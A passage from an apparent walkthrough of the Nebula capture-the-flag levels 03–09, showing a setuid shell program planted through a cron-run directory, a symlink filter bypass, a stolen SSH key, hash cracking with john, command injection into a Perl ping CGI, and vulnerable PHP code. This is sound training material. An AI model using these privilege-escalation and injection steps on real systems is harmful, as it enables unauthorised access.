</span><span class='line'>    <span class="o">(</span><span class="nb">ulimit</span> -t 5<span class="p">;</span> bash -x <span class="s2">&quot;$i&quot;</span><span class="o">)</span>
</span><span class='line'>    rm -f <span class="s2">&quot;$i&quot;</span>
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the mention of a cronjob, I assumed the <code>writable.sh</code> script was being run. From the source of the script we can see that everything in <code>/home/flag03/writable.d/</code> will have a ulimit set so that processes don’t take more than 5 seconds, and be executed using <code>bash -x</code>. Once done, the file is removed. Easy to exploit.</p>

<p>So, to solve level03:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span>vim /var/tmp/flag03.sh
</span><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span>cat /var/tmp/flag03.sh
</span><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>gcc /var/tmp/shell.c -o /var/tmp/flag03
</span><span class='line'>chmod 4777 /var/tmp/flag03
</span><span class='line'>
</span><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span>cat /var/tmp/shell.c
</span><span class='line'><span class="c">#include&lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int main<span class="o">(</span>void<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    setresuid<span class="o">(</span>geteuid<span class="o">()</span>, geteuid<span class="o">()</span>, geteuid<span class="o">())</span><span class="p">;</span>
</span><span class='line'>    system<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span>cp /var/tmp/flag03.sh /home/flag03/writable.d/
</span><span class='line'>
</span><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span><span class="c"># wait some time for the cronjob</span>
</span><span class='line'>
</span><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span>/var/tmp/flag03
</span><span class='line'>sh-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level04</h2>

<p><a href="https://exploit-exercises.com/nebula/level04/">Level04&rsquo;s Description</a>:</p>

<blockquote><p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p></blockquote>


<p>With the description we are provided with the source code of a small C program:</p>

<figure class='code'><figcaption><span>level4.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s [file to read]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;token&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You may not access &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to open %s&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to read fd %d&quot;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>From the snippet we can see that a check is in place for the first argument to see if the string <code>token</code> exists in it. As the token we want to read is actually called <em>token</em> this check will obviously prevent us from reading it. As we also don’t have write access to the file we cant rename it either. We can however make a symlink to it with a different name, thereby circumventing this check.</p>

<p>So, to solve level04:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level04@nebula:/home/flag04<span class="nv">$ </span>ln -s /home/flag04/token /var/tmp/flag04
</span><span class='line'>level04@nebula:/home/flag04<span class="nv">$ </span>./flag04 /var/tmp/flag04
</span><span class='line'>06508b5e-8909-4f38-b630-fdb148a848a2
</span><span class='line'>
</span><span class='line'>level04@nebula:/home/flag04<span class="nv">$ </span>su - flag04
</span><span class='line'>Password:
</span><span class='line'>flag04@nebula:~<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level05</h2>

<p><a href="https://exploit-exercises.com/nebula/level05/">Level05&rsquo;s Description</a>:</p>

<blockquote><p>Check the flag05 home directory. You are looking for weak directory permissions</p></blockquote>


<p>Browsing to the <code>flag05</code> directory we can see a <code>.backup</code> directory containing a tar archive that is readable. This archive contained a private key that allowed login as the <code>flag05</code> user.</p>

<p>So, to solve level05:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level05@nebula:~<span class="nv">$ </span><span class="nb">cd</span> ~flag05
</span><span class='line'>level05@nebula:/home/flag05<span class="nv">$ </span>ls -lah
</span><span class='line'>total 5.0K
</span><span class='line'>drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
</span><span class='line'>drwxr-xr-x 1 root   root     220 2012-08-27 07:18 ..
</span><span class='line'>drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
</span><span class='line'>-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
</span><span class='line'>-rw-r--r-- 1 flag05 flag05  3.3K 2011-05-18 02:54 .bashrc
</span><span class='line'>-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
</span><span class='line'>drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
</span><span class='line'>
</span><span class='line'>level05@nebula:/home/flag05<span class="nv">$ </span><span class="nb">cd</span> .backup/
</span><span class='line'>level05@nebula:/home/flag05/.backup<span class="nv">$ </span>ls -lah
</span><span class='line'>total 2.0K
</span><span class='line'>drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
</span><span class='line'>drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
</span><span class='line'>-rw-rw-r-- 1 flag05 flag05  1.8K 2011-11-20 20:13 backup-19072011.tgz
</span><span class='line'>
</span><span class='line'>level05@nebula:/home/flag05/.backup<span class="nv">$ </span>tar -xvf backup-19072011.tgz -C /var/tmp/
</span><span class='line'>.ssh/
</span><span class='line'>.ssh/id_rsa.pub
</span><span class='line'>.ssh/id_rsa
</span><span class='line'>.ssh/authorized_keys
</span><span class='line'>
</span><span class='line'>level05@nebula:/home/flag05/.backup<span class="nv">$ </span>ssh -i /var/tmp/.ssh/id_rsa flag05@127.0.0.1
</span><span class='line'>The authenticity of host <span class="s1">&#39;127.0.0.1 (127.0.0.1)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>127.0.0.1<span class="err">&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
</span><span class='line'>
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>flag05@nebula:~<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level06</h2>

<p><a href="https://exploit-exercises.com/nebula/level05/">Level06&rsquo;s Description</a>:</p>

<blockquote><p>The flag06 account credentials came from a legacy unix system.</p></blockquote>


<p>Legacy unix system? This immediately had me thinking that the password hash may be in <code>/etc/passwd</code>. Older unix systems used to store passwords this way, but that is no longer the case.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level06@nebula:~<span class="nv">$ </span>cat /etc/passwd<span class="p">|</span> grep flag06
</span><span class='line'>flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
</span></code></pre></td></tr></table></div></figure>


<p>The hash <code>ueqwOCnSGdsuM</code> is something that I had to send to <code>john</code> to crack. So I just copied it over to a Kali linux instance and attempted to crack it with brute force. It took a few micro seconds to crack :P</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>~ <span class="c"># cat hash</span>
</span><span class='line'>ueqwOCnSGdsuM
</span><span class='line'>
</span><span class='line'>~ <span class="c"># john hash</span>
</span><span class='line'>Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Traditional DES <span class="o">[</span>128/128 BS SSE2<span class="o">])</span>
</span><span class='line'>hello            <span class="o">(</span>?<span class="o">)</span>
</span><span class='line'>guesses: 1  <span class="nb">time</span>: 0:00:00:00 DONE <span class="o">(</span>Fri May  8 17:29:20 2015<span class="o">)</span>  c/s: 102400  trying: 123456 - Pyramid
</span><span class='line'>Use the <span class="s2">&quot;--show&quot;</span> option to display all of the cracked passwords reliably
</span></code></pre></td></tr></table></div></figure>


<p>The password is <code>hello</code>.
So, to solve level06:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level06@nebula:~<span class="nv">$ </span>su - flag06
</span><span class='line'>Password:
</span><span class='line'>flag06@nebula:~<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level07</h2>

<p><a href="https://exploit-exercises.com/nebula/level07/">Level07&rsquo;s Description</a>:</p>

<blockquote><p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p></blockquote>


<p>With the description we are provided with the source code of a small Perl program:</p>

<figure class='code'><figcaption><span>index.cgi</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
</span><span class='line'>
</span><span class='line'><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Content-type: text/html\n\n&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">ping</span> <span class="p">{</span>
</span><span class='line'>  <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">@output</span> <span class="o">=</span> <span class="sb">`ping -c 3 $host 2&gt;&amp;1`</span><span class="p">;</span>
</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s">&quot;$line&quot;</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># check if Host set. if not, display normal page, etc</span>
</span><span class='line'>
</span><span class='line'><span class="n">ping</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;Host&quot;</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure>


<p>This script has a very obvious command injection problem in the ping command. It also looks like something that should be served by a web server. In the <code>flag07</code> directory one can see a <code>thttpd.conf</code> file which contains the port of the webserver serving this script on.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level07@nebula:/home/flag07<span class="nv">$ </span>grep port thttpd.conf
</span><span class='line'><span class="c"># Specifies an alternate port number to listen on.</span>
</span><span class='line'><span class="nv">port</span><span class="o">=</span>7007
</span><span class='line'><span class="c"># all hostnames supported on the local machine. See thttpd(8) for details.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Exploiting the vulnerability simply meant that we have to inject commands into the <code>Host</code> parameter. I normally use python&rsquo;s urllib to ensure that fields are properly url encoded etc.</p>

<p>So, to solve level07:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>~ » curl -v <span class="s2">&quot;http://192.168.217.239:7007/index.cgi?$(python -c &#39;import urllib; print urllib.urlencode({ &quot;</span>Host<span class="s2">&quot; : &quot;</span>127.0.0.1 <span class="o">&amp;&amp;</span> gcc /var/tmp/shell.c -o /var/tmp/flag07 <span class="o">&amp;&amp;</span> chmod 4777 /var/tmp/flag07<span class="s2">&quot; })&#39;)&quot;</span>
</span><span class='line'>* Hostname was NOT found in DNS cache
</span><span class='line'>*   Trying 192.168.217.239...
</span><span class='line'>* Connected to 192.168.217.239 <span class="o">(</span>192.168.217.239<span class="o">)</span> port 7007 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /index.cgi?Host<span class="o">=</span>127.0.0.1+%26%26+gcc+%2Fvar%2Ftmp%2Fshell.c+-o+%2Fvar%2Ftmp%2Fflag07+%26%26+chmod+4777+%2Fvar%2Ftmp%2Fflag07 HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.37.1
</span><span class='line'>&gt; Host: 192.168.217.239:7007
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt;
</span><span class='line'>* HTTP 1.0, assume close after body
</span><span class='line'>&lt; HTTP/1.0 200 OK
</span><span class='line'>&lt; Content-type: text/html
</span><span class='line'>&lt;
</span><span class='line'>&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;PING 127.0.0.1 <span class="o">(</span>127.0.0.1<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
</span><span class='line'>64 bytes from 127.0.0.1: <span class="nv">icmp_req</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.011 ms
</span><span class='line'>64 bytes from 127.0.0.1: <span class="nv">icmp_req</span><span class="o">=</span>2 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.023 ms
</span><span class='line'>64 bytes from 127.0.0.1: <span class="nv">icmp_req</span><span class="o">=</span>3 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.022 ms
</span><span class='line'>
</span><span class='line'>--- 127.0.0.1 ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, <span class="nb">time </span>1998ms
</span><span class='line'>rtt min/avg/max/mdev <span class="o">=</span> 0.011/0.018/0.023/0.007 ms
</span><span class='line'>* Closing connection 0
</span><span class='line'>&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure>


<p>And finally back on the NebulaVM after this curl from my host:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level07@nebula:/home/flag07<span class="nv">$ </span>/var/tmp/flag07
</span><span class='line'>sh-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level08</h2>

<p><a href="https://exploit-exercises.com/nebula/level08/">Level08&rsquo;s Description</a>:</p>

<blockquote><p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p></blockquote>


<p>Logging in as the user <code>level08</code> reveals a pcap in the <code>flag08</code> directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level08@nebula:~<span class="nv">$ </span><span class="nb">cd</span> ~flag08
</span><span class='line'>level08@nebula:/home/flag08<span class="nv">$ </span>ls
</span><span class='line'>capture.pcap
</span><span class='line'>
</span><span class='line'>level08@nebula:/home/flag08<span class="nv">$ </span>file capture.pcap
</span><span class='line'>capture.pcap: tcpdump capture file <span class="o">(</span>little-endian<span class="o">)</span> - version 2.4 <span class="o">(</span>Ethernet, capture length 65535<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>I copied the pcap off the box and opened it on my Kali Linux VM with wireshark to investigate:</p>

<p><img src="https://i.imgur.com/Xc6IIbX.png"></p>

<p>Here we can see some data that got captured in clear text. It looks like a telnet session where someone was logging in with the <code>level8</code> account. The password though has a few dots in it. To make more sense of these, I switched the stream view to hex so that we can try see the ASCII codes of the keypresses.</p>

<p><img src="https://i.imgur.com/CWAERLv.png"></p>

<p><code>F7</code> according to the ASCII table is a backspace. That makes this easy :) Considering we have the password <code>backdoor...00Rm8.ate</code>, substituting the dot with backspaces we end up with <code>backd00Rmate</code> as the password.</p>

<p>So, to solve level08:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level08@nebula:/home/flag08<span class="nv">$ </span>su - flag08
</span><span class='line'>Password:
</span><span class='line'>
</span><span class='line'>flag08@nebula:~<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level09</h2>

<p><a href="https://exploit-exercises.com/nebula/level09/">Level09&rsquo;s Description</a>:</p>

<blockquote><p>There’s a C setuid wrapper for some vulnerable PHP code…</p></blockquote>


<p>With the description we are provided with the source code of a small PHP program:</p>

<figure class='code'><figcaption><span>level9.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">spam</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\./&quot;</span><span class="p">,</span> <span class="s2">&quot; dot &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/@/&quot;</span><span class="p">,</span> <span class="s2">&quot; AT &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$email</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">markup</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$use_me</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\[/&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\]/&quot;</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
